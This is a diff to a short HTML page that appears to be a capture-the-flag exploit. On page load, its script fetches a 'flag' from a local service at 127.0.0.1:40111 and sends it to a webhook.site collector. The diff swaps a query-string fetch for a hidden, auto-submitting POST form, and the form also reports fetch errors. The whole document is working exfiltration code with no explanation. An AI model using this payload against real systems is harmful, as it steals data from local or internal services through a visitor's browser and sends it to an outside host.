@@ -1,14 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
+
+<form id="exfiltrate" action="https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75" method="POST">
+    <textarea name="flag" id="flagdata" style="display:none;"></textarea>
+</form>
+
 <script>
-(async () => {
-  try {
-    const flag = await fetch("https://127.0.0.1:40111/flag")
-      .then(r => r.text());
-    await fetch("https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75?flag=" + encodeURIComponent(flag));
-  } catch (e) {}
-})();
+fetch("https://127.0.0.1:40111/flag")
+  .then(response => response.text())
+  .then(flag => {
+      document.getElementById("flagdata").value = flag;
+
+      document.getElementById("exfiltrate").submit();
+  })
+  .catch(err => {
+      document.getElementById("flagdata").value = "fetch_failed_" + err;
+      document.getElementById("exfiltrate").submit();
+  });
 </script>
+
 </body>
 </html>
